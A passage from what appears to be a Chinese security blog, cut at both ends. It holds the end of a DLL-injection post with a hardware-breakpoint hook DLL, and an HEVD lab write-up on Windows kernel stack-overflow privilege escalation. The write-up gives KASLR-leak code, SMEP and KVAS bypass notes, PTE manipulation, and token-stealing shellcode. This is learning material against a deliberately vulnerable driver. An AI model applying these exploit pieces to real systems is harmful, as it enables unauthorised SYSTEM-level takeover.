执行到指定地址会抛出 <strong><code>EXCEPTION_SINGLE_STEP</code></strong> 异常。</p><p>中断hook都得关闭kernel debug：<code>bcdedit /debug off</code></p><h4 id="实现方法-5"><a href="#实现方法-5" class="headerlink" title="实现方法"></a>实现方法</h4><ul><li><code>GetThreadContext</code> &#x2F; <code>SetThreadContext</code> ： 最关键 。这是应用层唯一能直接读写 CPU 寄存器（Dr0-Dr7）的接口。</li><li><code>SuspendThread</code> &#x2F; <code>ResumeThread</code> ：修改线程上下文前必须挂起线程，否则可能导致状态不一致或崩溃。</li><li><code>OpenThread</code> &#x2F; <code>CreateToolhelp32Snapshot</code> ：因为硬件断点是属于线程的（不是全局的），必须遍历并打开进程内的每一个线程分别设置。</li><li>设置寄存器 ：</li><li>Dr0 ：填入目标函数地址。</li><li>Dr7 ：控制位。启用 Dr0 (L0位)，并设置为“执行时触发”。</li><li>触发异常 ：CPU 运行到目标地址，触发 <code>EXCEPTION_SINGLE_STEP</code>。</li><li>VEH 捕获 ：检查 Dr6 寄存器，确认是否是由我们设置的断点触发的。</li><li>抗死锁机制 (Resume Flag) ：</li><li>不同于软件断点，这里不需要恢复内存（因为没改过内存）。</li><li>关键操作 ：设置 <code>EFLAGS</code> 寄存器的 RF (Resume Flag, 第16位) 为 1。</li><li>作用 ：告诉 CPU “请忽略下一条指令的断点”。如果没有这一步，CPU 会在同一行代码无限重复触发断点，导致死循环。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 编译命令: gcc -shared -o HardwareHook.dll HardwareHookFixed.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tlhelp32.h&gt;</span> <span class="comment">// 需要用到快照遍历线程</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* g_pTargetFunc = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">MyHookHandler</span><span class="params">()</span> &#123;</span><br><span class="line">    MessageBoxA(<span class="literal">NULL</span>, <span class="string">&quot;Hardware Hook Triggered via VEH!&quot;</span>, <span class="string">&quot;Hacked&quot;</span>, MB_OK);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// VEH 异常处理函数</span></span><br><span class="line">LONG WINAPI <span class="title function_">MyHwVEHHandler</span><span class="params">(PEXCEPTION_POINTERS pExceptionInfo)</span> &#123;</span><br><span class="line">    <span class="comment">// 硬件断点触发的是 EXCEPTION_SINGLE_STEP (0x80000004)</span></span><br><span class="line">    <span class="keyword">if</span> (pExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionCode == EXCEPTION_SINGLE_STEP) &#123;</span><br><span class="line">        <span class="comment">// 检查 DR6 的 B0 位 (Bit 0)，确认是否是 Dr0 触发的</span></span><br><span class="line">        <span class="keyword">if</span> (pExceptionInfo-&gt;ContextRecord-&gt;Dr6 &amp; <span class="number">0x1</span>) &#123;</span><br><span class="line">            <span class="comment">// 再次确认指令指针是否在目标地址</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line">            <span class="keyword">if</span> ((<span class="type">void</span>*)pExceptionInfo-&gt;ContextRecord-&gt;Rip == g_pTargetFunc)</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">            <span class="keyword">if</span> ((<span class="type">void</span>*)pExceptionInfo-&gt;ContextRecord-&gt;Eip == g_pTargetFunc)</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">            &#123;</span><br><span class="line">                MyHookHandler();</span><br><span class="line">                <span class="comment">// [关键] 设置 Resume Flag (RF 位, EFLAGS 第 16 位)</span></span><br><span class="line">                <span class="comment">// 作用：告诉 CPU &quot;忽略下一条指令的调试断点&quot;</span></span><br><span class="line">                <span class="comment">// 这样程序继续执行时，不会立刻再次触发断点，执行完一条指令后 RF 自动清除</span></span><br><span class="line">                <span class="comment">// 从而完美避开死循环。</span></span><br><span class="line">                pExceptionInfo-&gt;ContextRecord-&gt;EFlags |= <span class="number">0x10000</span>;</span><br><span class="line">                <span class="comment">// 清除 DR6 状态，为下次做准备</span></span><br><span class="line">                pExceptionInfo-&gt;ContextRecord-&gt;Dr6 &amp;= ~<span class="number">0x1</span>;</span><br><span class="line">                <span class="keyword">return</span> EXCEPTION_CONTINUE_EXECUTION;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> EXCEPTION_CONTINUE_SEARCH;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 给单个线程设置硬件断点</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">SetHardwareBreakpoint</span><span class="params">(DWORD dwThreadId, <span class="type">void</span>* address)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (dwThreadId == GetCurrentThreadId()) <span class="keyword">return</span>; <span class="comment">// 跳过当前注入线程</span></span><br><span class="line">    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, dwThreadId);</span><br><span class="line">    <span class="keyword">if</span> (!hThread) <span class="keyword">return</span>;</span><br><span class="line">    <span class="comment">// 必须挂起线程才能设置上下文</span></span><br><span class="line">    <span class="keyword">if</span> (SuspendThread(hThread) != (DWORD)<span class="number">-1</span>) &#123;</span><br><span class="line">        CONTEXT ctx = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;</span><br><span class="line">        <span class="keyword">if</span> (GetThreadContext(hThread, &amp;ctx)) &#123;</span><br><span class="line">            <span class="comment">// 设置 DR0</span></span><br><span class="line">            ctx.Dr0 = (DWORD_PTR)address;</span><br><span class="line">            <span class="comment">// 清除 DR7 旧状态</span></span><br><span class="line">            ctx.Dr7 &amp;= ~(<span class="number">1</span> | <span class="number">2</span> | <span class="number">4</span> | <span class="number">8</span>);  </span><br><span class="line">            <span class="comment">// 设置 DR7: L0=1 (启用Dr0), RW0=00 (执行断点), LEN0=00 (1字节)</span></span><br><span class="line">            ctx.Dr7 |= <span class="number">1</span>; </span><br><span class="line">            SetThreadContext(hThread, &amp;ctx);</span><br><span class="line">        &#125;</span><br><span class="line">        ResumeThread(hThread);</span><br><span class="line">    &#125;</span><br><span class="line">    CloseHandle(hThread);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 遍历当前进程的所有线程并设置断点</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">InstallHwHookForAllThreads</span><span class="params">()</span> &#123;</span><br><span class="line">    HMODULE hUser32 = LoadLibraryA(<span class="string">&quot;user32.dll&quot;</span>);</span><br><span class="line">    g_pTargetFunc = (<span class="type">void</span>*)GetProcAddress(hUser32, <span class="string">&quot;MessageBoxW&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!g_pTargetFunc) <span class="keyword">return</span>;</span><br><span class="line">    <span class="comment">// 1. 注册 VEH</span></span><br><span class="line">    AddVectoredExceptionHandler(<span class="number">1</span>, MyHwVEHHandler);</span><br><span class="line">    <span class="comment">// 2. 遍历所有线程</span></span><br><span class="line">    DWORD dwCurrentPid = GetCurrentProcessId();</span><br><span class="line">    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (hSnapshot != INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">        THREADENTRY32 te32;</span><br><span class="line">        te32.dwSize = <span class="keyword">sizeof</span>(THREADENTRY32);</span><br><span class="line">        <span class="keyword">if</span> (Thread32First(hSnapshot, &amp;te32)) &#123;</span><br><span class="line">            <span class="keyword">do</span> &#123;</span><br><span class="line">                <span class="comment">// 只处理属于当前进程的线程</span></span><br><span class="line">                <span class="keyword">if</span> (te32.th32OwnerProcessID == dwCurrentPid) &#123;</span><br><span class="line">                    SetHardwareBreakpoint(te32.th32ThreadID, g_pTargetFunc);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">while</span> (Thread32Next(hSnapshot, &amp;te32));</span><br><span class="line">        &#125;</span><br><span class="line">        CloseHandle(hSnapshot);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL WINAPI <span class="title function_">DllMain</span><span class="params">(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (fdwReason == DLL_PROCESS_ATTACH) &#123;</span><br><span class="line">        <span class="comment">// 使用新线程去执行安装，避免阻塞</span></span><br><span class="line">        CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)InstallHwHookForAllThreads, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="攻击效果-6"><a href="#攻击效果-6" class="headerlink" title="攻击效果"></a>攻击效果</h4><p><img src="/image/2025-12-12-windows_dll_injection/1765856651291.png" alt="1765856651291"></p>]]></content>
      
      
      <categories>
          
          <category> windows </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>[HEVD]栈溢出提权实验</title>
      <link href="/2025/12/02/2025-12-02-%5BHEVD%5Dlearning_windows_kernel/"/>
      <url>/2025/12/02/2025-12-02-%5BHEVD%5Dlearning_windows_kernel/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="windows-kernel"><a href="#windows-kernel" class="headerlink" title="windows kernel"></a>windows kernel</h1><h2 id="HEVD–栈溢出漏洞实现提权-1"><a href="#HEVD–栈溢出漏洞实现提权-1" class="headerlink" title="HEVD–栈溢出漏洞实现提权-1"></a>HEVD–栈溢出漏洞实现提权-1</h2><h3 id="environment"><a href="#environment" class="headerlink" title="environment"></a>environment</h3><p>实验机器：windows 10 ltsc 2021 19044.6575 (Hyper-V 虚拟机)</p><p>最终目标：本地提权 (LPE) 至 <code>NT AUTHORITY\SYSTEM</code></p><p><img src="/image/2025-12-02-%5BHEVD%5Dlearning_windows_kernel/1765094604279.png" alt="1765094604279"></p><h3 id="遇到的保护措施及绕过方案"><a href="#遇到的保护措施及绕过方案" class="headerlink" title="遇到的保护措施及绕过方案"></a>遇到的保护措施及绕过方案</h3><h4 id="1-KASLR-内核地址空间布局随机化"><a href="#1-KASLR-内核地址空间布局随机化" class="headerlink" title="1. KASLR (内核地址空间布局随机化)"></a>1. KASLR (内核地址空间布局随机化)</h4><ul><li><strong>原理</strong> ：系统启动时随机加载内核模块（如 <code>ntoskrnl.exe</code>）的基址，导致硬编码地址失效。</li><li><strong>绕过手段</strong> ： <strong>信息泄露 (Info Leak)</strong> 。</li><li><strong>实现</strong> ：利用 Windows API <code>EnumDeviceDrivers</code> 获取内核模块基址。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> KASLR_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KASLR_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;psapi.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="comment">// 自动链接 Psapi.lib，免去手动配置 VS 属性的麻烦</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;psapi.lib&quot;</span>)</span></span><br><span class="line"><span class="comment">// 获取内核模块基址的辅助函数</span></span><br><span class="line"><span class="comment">// 使用 static 关键字防止在多个 .c 文件引用时出现重定义错误</span></span><br><span class="line"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="title function_">GetKernelModuleAddress</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* targetModuleName)</span> &#123;</span><br><span class="line">    LPVOID drivers[<span class="number">1024</span>];</span><br><span class="line">    DWORD cbNeeded;</span><br><span class="line">    <span class="type">int</span> cDrivers, i;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> address = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 1. 获取所有驱动的加载地址列表</span></span><br><span class="line">    <span class="keyword">if</span> (EnumDeviceDrivers(drivers, <span class="keyword">sizeof</span>(drivers), &amp;cbNeeded) &amp;&amp; cbNeeded &lt; <span class="keyword">sizeof</span>(drivers)) &#123;</span><br><span class="line">        cDrivers = cbNeeded / <span class="keyword">sizeof</span>(drivers[<span class="number">0</span>]);</span><br><span class="line">        <span class="comment">// 2. 遍历列表，查找名字匹配的驱动</span></span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; cDrivers; i++) &#123;</span><br><span class="line">            <span class="type">char</span> szDriver[MAX_PATH];</span><br><span class="line">            <span class="comment">// 获取驱动的基础名称 (例如 ntoskrnl.exe)</span></span><br><span class="line">            <span class="keyword">if</span> (GetDeviceDriverBaseNameA(drivers[i], szDriver, <span class="keyword">sizeof</span>(szDriver) / <span class="keyword">sizeof</span>(szDriver[<span class="number">0</span>]))) &#123;</span><br><span class="line">                <span class="comment">// 不区分大小写比较</span></span><br><span class="line">                <span class="keyword">if</span> (_stricmp(szDriver, targetModuleName) == <span class="number">0</span>) &#123;</span><br><span class="line">                    address = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)drivers[i];</span><br><span class="line">                    <span class="comment">// 这里可以注释掉打印，以免干扰 EXP 的输出</span></span><br><span class="line">                    <span class="comment">// printf(&quot;[+] Found %s at address: 0x%llx\n&quot;, szDriver, address);</span></span><br><span class="line">                    <span class="keyword">break</span>; </span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] EnumDeviceDrivers failed or buffer too small.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> address;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// KASLR_H</span></span></span><br></pre></td></tr></table></figure><h3 id="2-SMEP-Supervisor-Mode-Execution-Prevention"><a href="#2-SMEP-Supervisor-Mode-Execution-Prevention" class="headerlink" title="2. SMEP (Supervisor Mode Execution Prevention)"></a>2. SMEP (Supervisor Mode Execution Prevention)</h3><ul><li><strong>原理</strong> ：CR4 寄存器第 <strong>20</strong> 位置 1。禁止 Ring 0 (内核) 执行 Ring 3 (用户) 页面的代码。</li><li><strong>尝试过的手段</strong> ：ROP 修改 CR4 ( <code>mov cr4, rcx</code> )。</li><li><strong>局限性</strong> ：虽然关闭了硬件 SMEP，但无法绕过 KVAS。</li></ul><h3 id="3-KVAS-内核页表隔离-Kernel-Virtual-Address-Shadow"><a href="#3-KVAS-内核页表隔离-Kernel-Virtual-Address-Shadow" class="headerlink" title="3. KVAS (内核页表隔离 Kernel Virtual Address Shadow)"></a>3. KVAS (内核页表隔离 <strong>Kernel</strong> <strong>Virtual</strong> <strong>Address</strong> <strong>Shadow</strong>)</h3><ul><li><strong>原理</strong> ：开启KVAS时，应用程序会有两个CR3，即有PCB.DirectoryTableBase和PCB.UserDirectoryTableBase两个域。其中DirectoryTableBase域可以理解为内核CR3，能够访问内核物理页，而ring3的Cr3（UserDirectoryTableBase）只映射了内核的KVASCODE区段的物理页（少数r3进入r0的入口），而没有映射其他区段的，因此通过ring3的Cr3寻找内核TEXT段的物理页，最多只能找到PPE，而从PDE开始就没有映射了。</li><li><strong>遇到的坑</strong> ：</li></ul><ol><li>直接跳转用户态 Shellcode -&gt; <code>Access Violation (0xC0000005)</code> (因为找不到页面)。</li></ol><ul><li><strong>最终绕过手段</strong> ： <strong>PTE 篡改 (PTE Manipulation)</strong> 。</li><li><strong>思路</strong> ：不回用户态，而是将 Shellcode 搬运到内核空间。</li><li><strong>目标</strong> ：<code>KUSER_SHARED_DATA</code> (<code>0xFFFFF78000000000</code>)。用户空间和内核空间的共享区域，地址<strong>固定</strong>，内核程序对这块共享区域有<strong>可读</strong>、<strong>可写</strong>的权限，用户程序对这块共享区域只有<strong>只读</strong>的权限。</li><li><strong>操作</strong> ：利用 ROP 修改该页面的  <strong>PTE (页表项)</strong> ，清除 <strong>NX (No-Execute)</strong> 位。</li></ul><h4 id="PTE-权限位-MMPTE-HARDWARE-以及地址计算"><a href="#PTE-权限位-MMPTE-HARDWARE-以及地址计算" class="headerlink" title="PTE 权限位 (_MMPTE_HARDWARE)以及地址计算"></a>PTE 权限位 (<code>_MMPTE_HARDWARE</code>)以及地址计算</h4><p>PTE 本质上是一个 64位 (8字节) 的数值。我们需要精准控制其中的某一位。</p><p><strong>PTE 关键位布局 (Bit Map):</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">1: kd&gt; dt nt!_MMPTE_HARDWARE</span><br><span class="line">   +0x000 Valid            : Pos 0, 1 Bit</span><br><span class="line">   +0x000 Dirty1           : Pos 1, 1 Bit</span><br><span class="line">   +0x000 Owner            : Pos 2, 1 Bit</span><br><span class="line">   +0x000 WriteThrough     : Pos 3, 1 Bit</span><br><span class="line">   +0x000 CacheDisable     : Pos 4, 1 Bit</span><br><span class="line">   +0x000 Accessed         : Pos 5, 1 Bit</span><br><span class="line">   +0x000 Dirty            : Pos 6, 1 Bit</span><br><span class="line">   +0x000 LargePage        : Pos 7, 1 Bit</span><br><span class="line">   +0x000 Global           : Pos 8, 1 Bit</span><br><span class="line">   +0x000 CopyOnWrite      : Pos 9, 1 Bit</span><br><span class="line">   +0x000 Unused           : Pos 10, 1 Bit</span><br><span class="line">   +0x000 Write            : Pos 11, 1 Bit</span><br><span class="line">   +0x000 PageFrameNumber  : Pos 12, 36 Bits</span><br><span class="line">   +0x000 ReservedForHardware : Pos 48, 4 Bits</span><br><span class="line">   +0x000 ReservedForSoftware : Pos 52, 4 Bits</span><br><span class="line">   +0x000 WsleAge          : Pos 56, 4 Bits</span><br><span class="line">   +0x000 WsleProtection   : Pos 60, 3 Bits</span><br><span class="line">   +0x000 NoExecute        : Pos 63, 1 Bit</span><br></pre></td></tr></table></figure><table><thead><tr><th>位 (Bit)</th><th>名称</th><th>说明</th><th>EXP 关注点</th></tr></thead><tbody><tr><td>63(最高位)</td><td>NX (No-Execute)</td><td>1&#x3D;禁止执行 , 0&#x3D;允许执行</td><td>攻击目标！我们要把它置 0</td></tr><tr><td>12-62</td><td>PFN</td><td>物理页帧号 (实际物理地址)</td><td>动了就找不到物理内存了</td></tr><tr><td>2</td><td>U&#x2F;S (User&#x2F;Supervisor)</td><td>0&#x3D;内核页, 1&#x3D;用户页</td><td>保持 0 (内核页)</td></tr><tr><td>1</td><td>R&#x2F;W (Read&#x2F;Write)</td><td>1&#x3D;可写, 0&#x3D;只读</td><td>保持 1 (我们需要写入 Shellcode)</td></tr><tr><td>0</td><td>P (Present)</td><td>1&#x3D;页面有效 , 0&#x3D;无效</td><td>置 0 会直接缺页蓝屏</td></tr></tbody></table><p><strong>PTE 地址计算公式：</strong></p><p>在 Windows x64 中，页表本身也映射在虚拟内存中。计算公式如下：</p><p>$$<br>\text{PTE_Addr} &#x3D; \text{PTE_BASE} + (\text{VirtualAddress} \gg 9) \times 8<br>$$</p><p>或者用位运算优化版（我们在 EXP 中用的）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PTE_Addr = PTE_BASE + (VirtualAddress &gt;&gt; 9) &amp; 0x7FFFFFFFF8</span><br></pre></td></tr></table></figure><p><strong>Win10 1607 (RS1) 及之后</strong> ：为了安全，微软引入了  <strong>页表基址随机化</strong> 。</p><p><strong>原理</strong> ：PML4 表（顶级页表）有 512 个条目。系统启动时，随机选择一个条目（例如第 <code>idx</code> 项）指向 PML4 自身。</p><p><strong>绕过随机化</strong>：利用 <code>MiGetPteAddress</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000140298780 MiGetPteAddress proc near               ; CODE XREF: MiPfPrepareSequentialReadList+2D0↓p</span><br><span class="line">.text:0000000140298780                                         ; MiPfPrepareSequentialReadList+2DB↓p ...</span><br><span class="line">.text:0000000140298780                 shr     rcx, 9</span><br><span class="line">.text:0000000140298784                 mov     rax, 7FFFFFFFF8h</span><br><span class="line">.text:000000014029878E                 and     rcx, rax</span><br><span class="line">.text:0000000140298791                 mov     rax, 0FFFFF68000000000h ; 这里的立即数就是动态的 PTE_BASE</span><br><span class="line">.text:000000014029879B                 add     rax, rcx</span><br><span class="line">.text:000000014029879E                 retn</span><br><span class="line">.text:000000014029879E MiGetPteAddress endp</span><br></pre></td></tr></table></figure><h3 id="4-提权手段：Token-Stealing-令牌窃取"><a href="#4-提权手段：Token-Stealing-令牌窃取" class="headerlink" title="4. 提权手段：Token Stealing (令牌窃取)"></a>4. 提权手段：Token Stealing (令牌窃取)</h3><p><strong>原理</strong> ：遍历系统进程链表，找到 System 进程 (PID 4)，将其 Token 复制给当前进程。</p><p> <strong>Shellcode 逻辑</strong> ：</p><ol><li>获取当前进程 <code>_EPROCESS</code>。</li><li>遍历 <code>ActiveProcessLinks</code> 链表。</li><li>匹配 <code>UniqueProcessId == 4</code>。</li><li>读取 System Token，写入当前进程的 Token 字段。</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">start:</span><br><span class="line">xor rax, rax</span><br><span class="line">mov rax, [gs:rax + 188h]; gs[0] == KPCR, Get KPCRB.CurrentThread field</span><br><span class="line">mov rax, [rax+0xb8]; Get (KAPC_STATE)ApcState.Process (our EPROCESS)</span><br><span class="line">mov r9, rax;; Backup target EPROCESS at r9</span><br><span class="line"></span><br><span class="line">; loop processes list</span><br><span class="line">mov rax, [rax + 0x448]; +0x448 ActiveProcessLinks : _LIST_ENTRY.Flink; Read first link</span><br><span class="line">mov rax, [rax]; Follow the first link</span><br><span class="line">system_process_loop:</span><br><span class="line">mov rdx, [rax - 0x8]; ProcessId</span><br><span class="line">mov r8, rax;; backup system EPROCESS.ActiveProcessLinks pointer at r8</span><br><span class="line">mov rax, [rax]; Next process</span><br><span class="line">cmp rdx, 4; System PID</span><br><span class="line">jnz system_process_loop</span><br><span class="line"></span><br><span class="line">mov rdx, [r8 + 0x70]</span><br><span class="line">and rdx, 0xfffffffffffffff8; Ignore ref count</span><br><span class="line">mov rcx, [r9 + 0x4b8]</span><br><span class="line">and rcx, 0x7</span><br><span class="line">add rdx, rcx; put target&#x27;s ref count into our token</span><br><span class="line">mov [r9 + 0x4b8], rdx; rdx = system token; KPROCESS+0x4b8 is the Token, KPROCESS+0x448 is the process links - 0x70 is the diff</span><br><span class="line"></span><br><span class="line">;db 0xcc</span><br><span class="line">ret_to_usermode:</span><br><span class="line">;sti</span><br><span class="line">mov rax, [gs:0x188]; _KPCR.Prcb.CurrentThread</span><br><span class="line">;mov cx, [rax + 0x1e4]; KTHREAD.KernelApcDisable</span><br><span class="line">;inc cx</span><br><span class="line">;mov [rax + 0x1e4], cx</span><br><span class="line">mov rdx, [rax + 0x90] ; ETHREAD.TrapFrame</span><br><span class="line">mov rcx, [rdx + 0x168]; ETHREAD.TrapFrame.Rip</span><br><span class="line">mov r11, [rdx + 0x178]; ETHREAD.TrapFrame.EFlags</span><br><span class="line">or r11, 0x200 ; 这样 sysret 恢复状态时，中断就会被打开</span><br><span class="line">mov rsp, [rdx + 0x180]; ETHREAD.TrapFrame.Rsp</span><br><span class="line">mov rbp, [rdx + 0x158]; ETHREAD.TrapFrame.Rbp</span><br><span class="line">;db 0xcc</span><br><span class="line">xor eax, eax ; return STATUS_SUCCESS to NtDeviceIoControlFile </span><br><span class="line">swapgs</span><br><span class="line">o64 sysret; nasm shit</span><br></pre></td></tr></table></figure><h3 id="5-相关结构体"><a href="#5-相关结构体" class="headerlink" title="5.相关结构体"></a>5.相关结构体</h3><h4 id="EPROCESS-进程结构体"><a href="#EPROCESS-进程结构体" class="headerlink" title="_EPROCESS (进程结构体)"></a>_EPROCESS (进程结构体)</h4><ul><li><code>dt nt!_EPROCESS</code></li><li>关键偏移：<ul><li>0x440: <code>UniqueProcessId</code> (PID)</li><li>0x448: <code>ActiveProcessLinks</code> (链表)</li><li>0x4b8: <code>Token</code> (令牌)</li></ul></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 